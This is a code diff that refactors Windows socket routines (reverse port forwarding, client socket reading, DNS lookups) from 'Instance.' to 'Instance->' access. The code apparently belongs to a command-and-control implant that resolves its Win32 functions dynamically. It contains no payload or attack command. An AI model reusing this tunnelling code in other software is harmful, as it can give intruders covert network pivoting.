@@ -12,7 +12,7 @@ BOOL RecvAll( SOCKET Socket, PVOID Buffer, DWORD Length, PDWORD BytesRead )
 
     while ( tret < Length )
     {
-        nret = Instance.Win32.recv( Socket, Start, Length - tret, 0 );
+        nret = Instance->Win32.recv( Socket, Start, Length - tret, 0 );
 
         if ( nret == SOCKET_ERROR )
         {
@@ -36,20 +36,20 @@ BOOL InitWSA( VOID )
     DWORD   Result = 0;
 
     /* Init Windows Socket. */
-    if ( Instance.WSAWasInitialised == FALSE )
+    if ( Instance->WSAWasInitialised == FALSE )
     {
         PUTS( "Init Windows Socket..." )
 
-        if ( ( Result = Instance.Win32.WSAStartup( MAKEWORD( 2, 2 ), &WsData ) ) != 0 )
+        if ( ( Result = Instance->Win32.WSAStartup( MAKEWORD( 2, 2 ), &WsData ) ) != 0 )
         {
             PRINTF( "WSAStartup Failed: %d\n", Result )
 
             /* cleanup and be gone. */
-            Instance.Win32.WSACleanup();
+            Instance->Win32.WSACleanup();
             return FALSE;
         }
 
-        Instance.WSAWasInitialised = TRUE;
+        Instance->WSAWasInitialised = TRUE;
     }
 
     return TRUE;
@@ -75,7 +75,7 @@ PSOCKET_DATA SocketNew( SOCKET WinSock, DWORD Type, BOOL UseIpv4, DWORD IPv4, PB
 
         if ( UseIpv4 )
         {
-            WinSock = Instance.Win32.WSASocketA( AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, NULL );
+            WinSock = Instance->Win32.WSASocketA( AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, NULL );
             if ( WinSock == INVALID_SOCKET )
             {
                 PRINTF( "WSASocketA Failed: %d\n", NtGetLastError() )
@@ -97,7 +97,7 @@ PSOCKET_DATA SocketNew( SOCKET WinSock, DWORD Type, BOOL UseIpv4, DWORD IPv4, PB
         }
         else
         {
-            WinSock = Instance.Win32.WSASocketA( AF_INET6, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0 );
+            WinSock = Instance->Win32.WSASocketA( AF_INET6, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0 );
             if ( WinSock == INVALID_SOCKET )
             {
                 PRINTF( "WSASocketA Failed: %d\n", NtGetLastError() )
@@ -123,7 +123,7 @@ PSOCKET_DATA SocketNew( SOCKET WinSock, DWORD Type, BOOL UseIpv4, DWORD IPv4, PB
             if ( UseIpv4 )
             {
                 /* connect to host:port */
-                if ( Instance.Win32.connect( WinSock, ( struct sockaddr * ) &SockAddr, sizeof( SOCKADDR_IN ) ) == SOCKET_ERROR )
+                if ( Instance->Win32.connect( WinSock, ( struct sockaddr * ) &SockAddr, sizeof( SOCKADDR_IN ) ) == SOCKET_ERROR )
                 {
                     PRINTF( "connect failed: %d\n", NtGetLastError() )
                     goto CLEANUP;
@@ -132,7 +132,7 @@ PSOCKET_DATA SocketNew( SOCKET WinSock, DWORD Type, BOOL UseIpv4, DWORD IPv4, PB
             else
             {
                 /* connect to host:port */
-                if ( Instance.Win32.connect( WinSock, ( struct sockaddr * ) &SockAddr6, sizeof( SOCKADDR_IN6_LH ) ) == SOCKET_ERROR )
+                if ( Instance->Win32.connect( WinSock, ( struct sockaddr * ) &SockAddr6, sizeof( SOCKADDR_IN6_LH ) ) == SOCKET_ERROR )
                 {
                     PRINTF( "connect failed: %d\n", NtGetLastError() )
                     goto CLEANUP;
@@ -140,7 +140,7 @@ PSOCKET_DATA SocketNew( SOCKET WinSock, DWORD Type, BOOL UseIpv4, DWORD IPv4, PB
             }
 
             /* set socket to non blocking */
-            if ( Instance.Win32.ioctlsocket( WinSock, FIONBIO, &IoBlock ) == SOCKET_ERROR )
+            if ( Instance->Win32.ioctlsocket( WinSock, FIONBIO, &IoBlock ) == SOCKET_ERROR )
             {
                 PRINTF( "ioctlsocket failed: %d\n", NtGetLastError() )
                 goto CLEANUP;
@@ -153,21 +153,21 @@ PSOCKET_DATA SocketNew( SOCKET WinSock, DWORD Type, BOOL UseIpv4, DWORD IPv4, PB
             // SOCKET_TYPE_REVERSE_PORTFWD only supports IPv4
 
             /* set socket to non blocking */
-            if ( Instance.Win32.ioctlsocket( WinSock, FIONBIO, &IoBlock ) == SOCKET_ERROR )
+            if ( Instance->Win32.ioctlsocket( WinSock, FIONBIO, &IoBlock ) == SOCKET_ERROR )
             {
                 PRINTF( "ioctlsocket failed: %d\n", NtGetLastError() )
                 goto CLEANUP;
             }
 
             /* bind the socket */
-            if ( Instance.Win32.bind( WinSock, ( struct sockaddr * ) &SockAddr, sizeof( SOCKADDR_IN ) ) == SOCKET_ERROR )
+            if ( Instance->Win32.bind( WinSock, ( struct sockaddr * ) &SockAddr, sizeof( SOCKADDR_IN ) ) == SOCKET_ERROR )
             {
                 PRINTF( "bind failed: %d\n", NtGetLastError() )
                 goto CLEANUP;
             }
 
             /* now listen... */
-            if ( Instance.Win32.listen( WinSock, 1 ) == SOCKET_ERROR )
+            if ( Instance->Win32.listen( WinSock, 1 ) == SOCKET_ERROR )
             {
                 PRINTF( "listen failed: %d\n", NtGetLastError() )
                 goto CLEANUP;
@@ -189,9 +189,9 @@ PSOCKET_DATA SocketNew( SOCKET WinSock, DWORD Type, BOOL UseIpv4, DWORD IPv4, PB
     Socket->FwdAddr      = FwdAddr;
     Socket->FwdPort      = FwdPort;
     Socket->Socket       = WinSock;
-    Socket->Next         = Instance.Sockets;
+    Socket->Next         = Instance->Sockets;
 
-    Instance.Sockets = Socket;
+    Instance->Sockets = Socket;
 
     PRINTF( "SocketNew => ID:[%x] Parent:[%x] WinSock:[%x] Type:[%d] IPv4:[%lx] IPv6:[%lx] LclPort:[%ld] FwdAddr:[%lx] FwdPort:[%ld]\n", Socket->ID, ParentID, WinSock, Type, IPv4, IPv6, LclPort, FwdAddr, FwdPort )
 
@@ -202,7 +202,7 @@ CLEANUP:
     {
         // close the socket preserving the last error code
         ErrorCode = NtGetLastError();
-        Instance.Win32.closesocket( WinSock );
+        Instance->Win32.closesocket( WinSock );
         NtSetLastError(ErrorCode);
     }
 
@@ -218,7 +218,7 @@ VOID SocketClients()
     SOCKET       WinSock = 0;
     u_long       IoBlock = 1;
 
-    Socket = Instance.Sockets;
+    Socket = Instance->Sockets;
 
     /* First lets check for new clients */
     for ( ;; )
@@ -235,11 +235,11 @@ VOID SocketClients()
         if ( Socket->Type == SOCKET_TYPE_REVERSE_PORTFWD )
         {
             /* accept connection */
-            WinSock = Instance.Win32.accept( Socket->Socket, NULL, NULL );
+            WinSock = Instance->Win32.accept( Socket->Socket, NULL, NULL );
             if ( WinSock != INVALID_SOCKET )
             {
                 /* set socket to non blocking */
-                if ( Instance.Win32.ioctlsocket( WinSock, FIONBIO, &IoBlock ) != SOCKET_ERROR )
+                if ( Instance->Win32.ioctlsocket( WinSock, FIONBIO, &IoBlock ) != SOCKET_ERROR )
                 {
                     /* Add the client to the socket linked list so we can read from it later on */
                     Client = SocketNew( WinSock, SOCKET_TYPE_CLIENT, TRUE, Socket->IPv4, NULL, Socket->LclPort, Socket->FwdAddr, Socket->FwdPort, Socket->ID );
@@ -268,7 +268,7 @@ VOID SocketClients()
                     PRINTF( "ioctlsocket failed: %d\n", NtGetLastError() )
 
                     /* close socket. */
-                    Instance.Win32.closesocket( WinSock );
+                    Instance->Win32.closesocket( WinSock );
                 }
             }
         }
@@ -288,7 +288,7 @@ VOID SocketRead()
     BOOL         Failed      = FALSE;
     DWORD        ErrorCode   = 0;
 
-    Socket = Instance.Sockets;
+    Socket = Instance->Sockets;
 
     /* First lets check for new clients */
     for ( ;; )
@@ -320,7 +320,7 @@ VOID SocketRead()
                  * this might not be the same as the total amount of data queued on the socket.
                  * because of this, we read for new data in a loop
                  */
-                if ( Instance.Win32.ioctlsocket( Socket->Socket, FIONREAD, &PartialData.Length ) == SOCKET_ERROR )
+                if ( Instance->Win32.ioctlsocket( Socket->Socket, FIONREAD, &PartialData.Length ) == SOCKET_ERROR )
                 {
                     PRINTF( "Failed to get the read size from %x : %d\n", Socket->ID, Socket->Type )
 
@@ -328,7 +328,7 @@ VOID SocketRead()
                     Socket->ShouldRemove = TRUE;
 
                     Failed    = TRUE;
-                    ErrorCode = Instance.Win32.WSAGetLastError();
+                    ErrorCode = Instance->Win32.WSAGetLastError();
                 }
 
                 if ( PartialData.Length > 0 )
@@ -337,7 +337,7 @@ VOID SocketRead()
 
                     if ( ! RecvAll( Socket->Socket, PartialData.Buffer, PartialData.Length, &PartialData.Length ) ) {
                         Failed    = TRUE;
-                        ErrorCode = Instance.Win32.WSAGetLastError();
+                        ErrorCode = Instance->Win32.WSAGetLastError();
                     }
 
                     if ( PartialData.Length > 0 )
@@ -470,7 +470,7 @@ VOID SocketFree( PSOCKET_DATA Socket )
 
     if ( Socket->Socket )
     {
-        Instance.Win32.closesocket( Socket->Socket );
+        Instance->Win32.closesocket( Socket->Socket );
         Socket->Socket = 0;
     }
 
@@ -489,7 +489,7 @@ VOID SocketCleanDead()
      *       make that after the socket got used close it.
      *       maybe add a timeout ? after the socket didn't got used after a certain period of time.
      */
-    Socket = Instance.Sockets;
+    Socket = Instance->Sockets;
     for ( ;; )
     {
         if ( ! Socket )
@@ -500,9 +500,9 @@ VOID SocketCleanDead()
             /* we are at the beginning. */
             if ( ! SkLast )
             {
-                Instance.Sockets = Socket->Next;
+                Instance->Sockets = Socket->Next;
                 SocketFree( Socket );
-                Socket = Instance.Sockets;
+                Socket = Instance->Sockets;
             }
             else
             {
@@ -550,7 +550,7 @@ DWORD DnsQueryIPv4( LPSTR Domain )
     hints.ai_socktype = SOCK_STREAM;
     hints.ai_protocol = IPPROTO_TCP;
 
-    Ret = Instance.Win32.getaddrinfo( Domain, NULL, &hints, &res );
+    Ret = Instance->Win32.getaddrinfo( Domain, NULL, &hints, &res );
     if ( Ret != 0 )
     {
         PRINTF( "getaddrinfo failed with %d for %s\n", Ret, Domain );
@@ -559,7 +559,7 @@ DWORD DnsQueryIPv4( LPSTR Domain )
 
     IP = ((struct sockaddr_in *)res->ai_addr)->sin_addr.S_un.S_addr;
 
-    Instance.Win32.freeaddrinfo( res );
+    Instance->Win32.freeaddrinfo( res );
 
     PRINTF( "Got IPv4 for %s: %d.%d.%d.%d\n",
         Domain,
@@ -591,7 +591,7 @@ PBYTE DnsQueryIPv6( LPSTR Domain )
     hints.ai_socktype = SOCK_STREAM;
     hints.ai_protocol = IPPROTO_TCP;
 
-    Ret = Instance.Win32.getaddrinfo( Domain, NULL, &hints, &res );
+    Ret = Instance->Win32.getaddrinfo( Domain, NULL, &hints, &res );
     if ( Ret != 0 )
     {
         PRINTF( "getaddrinfo failed with %d for %s\n", Ret, Domain );
@@ -599,11 +599,11 @@ PBYTE DnsQueryIPv6( LPSTR Domain )
     }
 
     // the caller is responsible for freeing this!
-    IPv6 = Instance.Win32.LocalAlloc( LPTR, 16 );
+    IPv6 = Instance->Win32.LocalAlloc( LPTR, 16 );
 
     MemCopy( IPv6, ((struct sockaddr_in6 *)res->ai_addr)->sin6_addr.u.Byte, 16 );
 
-    Instance.Win32.freeaddrinfo( res );
+    Instance->Win32.freeaddrinfo( res );
 
     PRINTF( "Got IPv6 for %s: %02x%02x:%02x%02x:%02x%02x:%02x%02x:%02x%02x:%02x%02x:%02x%02x:%02x%02x\n",
         Domain,
